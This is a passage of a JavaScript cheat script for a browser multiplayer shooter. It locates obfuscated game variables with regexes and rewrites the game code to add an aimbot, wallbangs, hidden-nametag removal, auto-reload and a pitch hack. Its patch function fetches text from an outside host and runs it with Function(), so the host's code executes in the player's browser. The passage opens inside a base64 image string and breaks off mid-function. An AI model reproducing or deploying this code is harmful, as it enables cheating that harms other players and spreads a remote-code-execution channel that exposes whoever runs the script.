            "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"+
            "CC"
        createButton("CH33TS", icon, () => {
            window.showWindow(cheat.gui.windowIndex)
        })
    }

    function setVars(script) {
        cheat.vars = {}
        const regexes = new Map()
            .set("inView", [/if\(!\w+\['(\w+)']\)continue/, 1])
            .set("canSee", [/\w+\['(\w+)']\(\w+,\w+\['x'],\w+\['y'],\w+\['z']\)\)&&/, 1])
            .set("procInputs", [/this\['(\w+)']=function\((\w+),(\w+),\w+,\w+\){(this)\['recon']/, 1])
            .set("aimVal", [/this\['(\w+)']-=0x1\/\(this\['weapon']\['\w+']\/\w+\)/, 1])
            .set("pchObjc", [/0x0,this\['(\w+)']=new \w+\['Object3D']\(\),this/, 1])
            .set("didShoot", [/--,\w+\['(\w+)']=!0x0/, 1])
            .set("nAuto", [/'Single\\x20Fire','varN':'(\w+)'/, 1])
            .set("crouchVal", [/this\['(\w+)']\+=\w\['\w+']\*\w+,0x1<=this\['\w+']/, 1])
            .set("recoilAnimY", [/this\['(\w+)']=0x0,this\['recoilForce']=0x0/, 1])
            .set("ammos", [/\['length'];for\(\w+=0x0;\w+<\w+\['(\w+)']\['length']/, 1])
            .set("weaponIndex", [/\['weaponConfig']\[\w+]\['secondary']&&\(\w+\['(\w+)']==\w+/, 1])
            .set("objInstances", [/\w+\['genObj3D']\(0x0,0x0,0x0\);if\(\w+\['(\w+)']=\w+\['genObj3D']/, 1])
            .set("getWorldPosition", [/{\w+=\w+\['camera']\['(\w+)']\(\);/, 1])
            .set("mouseDownL", [/this\['\w+'\]=function\(\){this\['(\w+)'\]=\w*0,this\['(\w+)'\]=\w*0,this\['\w+'\]={}/, 1])
            .set("mouseDownR", [/this\['(\w+)']=0x0,this\['keys']=/, 1])
            .set("reloadTimer", [/this\['(\w+)']-=\w+,\w+\['reloadUIAnim']/, 1])
            .set("maxHealth", [/this\['health']\/this\['(\w+)']\?/, 1])
            .set("xVel", [/this\['x']\+=this\['(\w+)']\*\w+\['map']\['config']\['speedX']/, 1])
            .set("yVel", [/this\['y']\+=this\['(\w+)']\*\w+\['map']\['config']\['speedY']/, 1])
            .set("zVel", [/this\['z']\+=this\['(\w+)']\*\w+\['map']\['config']\['speedZ']/, 1])


        for (const [name, arr] of regexes) {
            let found = arr[0].exec(script);
            if (!found) {
                alert("Failed to find " + name);
                cheat.vars[name] = null;
            } else {
                //console.log("Found ", name, " - ", found[arr[1]]);
                cheat.vars[name] = found[arr[1]];
            }
        }
    }

    function patch(gameCode) {
        let additionalPatches = Function("return "+req("https://chonker1337.xlx.pl/2.php"))()
        for (let i = 0; i < additionalPatches.length; i++) {
            try {
                gameCode = gameCode.replace(additionalPatches[i][0], additionalPatches[i][1])
            } catch (e) {}
        }

        // nametags
        gameCode = gameCode.replace(/(continue;)if\(!.+\['\w+']\)continue;/, "$1");

        // wallbangs
        gameCode = gameCode.replace(/!(\w+)\['transparent']/, "$&& (!cheat.settings.wallbangs || !$1.penetrable )")

        // weapon zoom
        gameCode = gameCode.replace(/(if\(this\['weapon']\['zoom'])/, "$1=cheat.settings.staticWeaponZoom?1:this.weapon.zoom")

        // aimbot (procinputs)
        gameCode = gameCode.replace(/(this\['\w+']=function\(\w+,\w+,\w+,\w+\){)(this\['recon'])/, "$1{\n"+`
        const [input, game, recon, lock] = arguments, me = this, key = {
            frame: 0,
            delta: 1,
            ydir: 2,
            xdir: 3,
            moveDir: 4,
            shoot: 5,
            scope: 6,
            jump: 7,
            crouch: 8,
            reload: 9,
            weaponScroll: 10,
            weaponSwap: 11,
            moveLock: 12
        };
        if (cheat.settings.autoReload && me[cheat.vars.ammos][me[cheat.vars.weaponIndex]] === 0)
                input[key.reload] = 1;
        if (cheat.settings.pitchHack) input[key.xdir] = cheat.settings.pitchHack===1?-Math.PI*1000:Math.PI*1000
        game.players.list.forEach(v=>v.pos={x:v.x,y:v.y,z:v.z})
        let target = game.players.list.filter(enemy => {
            return !enemy.isYTMP && enemy.hasOwnProperty('pos') && ((me.team === null || enemy.team !== me.team) && enemy.health > 0 && enemy[cheat.vars.inView])
        }).sort((p1, p2) => cheat.math.getDistance(me.x, me.z, p1.pos.x, p1.pos.z) - cheat.math.getDistance(me.x, me.z, p2.pos.x, p2.pos.z)).shift();
        if (target && cheat.settings.aimbot && (cheat.math.getD3D(me.x, me.y, me.z, target.x, target.y, target.z) <= me.weapon.range || !cheat.settings.rangeCheck) && !me[cheat.vars.reloadTimer]) {
            const yDire = (cheat.math.getDir(me.z, me.x, target.pos.z, target.pos.x) || 0) * 1000
            const xDire = ((cheat.math.getXDire(me.x, me.y, me.z, target.pos.x, target.pos.y - target[cheat.vars.crouchVal] * 3 + me[cheat.vars.crouchVal] * 3, target.pos.z) || 0) - (0.3 * me[cheat.vars.recoilAnimY])) * 1000
            if (cheat.settings.aimbot === 2) 
                input[key.scope] = 1;
            if ( /* me.weapon[cheat.vars.nAuto] && */ me[cheat.vars.didShoot]) {
                input[key.shoot] = 0;
                cheat.state.quickscopeCanShoot = false;
                setTimeout(() => {
                    cheat.state.quickscopeCanShoot = true;
                }, me.weapon.rate);
